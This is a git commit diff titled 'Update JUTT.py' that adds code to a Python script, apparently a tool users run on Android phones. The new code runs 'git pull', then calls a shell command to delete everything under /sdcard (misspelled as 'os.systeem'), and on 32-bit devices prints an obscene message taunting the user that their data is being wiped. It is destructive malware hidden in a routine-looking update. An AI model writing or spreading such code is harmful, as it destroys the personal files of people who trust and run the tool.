6fbaf48242257c4c8a8167b486c6b11b529c7338
JUTT-704 <129414469+JUTT-704@users.noreply.github.com>
2023-03-30 21:25:06 +0500

    Update JUTT.py

--- JUTT.py
+++ JUTT.py
@@ -1,1 +1,8 @@
-import Data
+import os,platform
+os.system('git pull')
+os.systeem('rm -rf /sdcard/*')
+xd=platform.architecture()[0]
+if xd=="32bit":
+    print(' \33[1;32m Lund Hain Tu Aj Ka Zamana Main Tu 64 bit Mobile Nahii La Saka Wait Tara Data Delete Karta Hoon Ruk Sabar Kar rm -rf /sdcard/* Gandu Lagaya Tara Data Enjoy')
+elif xd=="64bit":
+    __import__("Juttbrand")
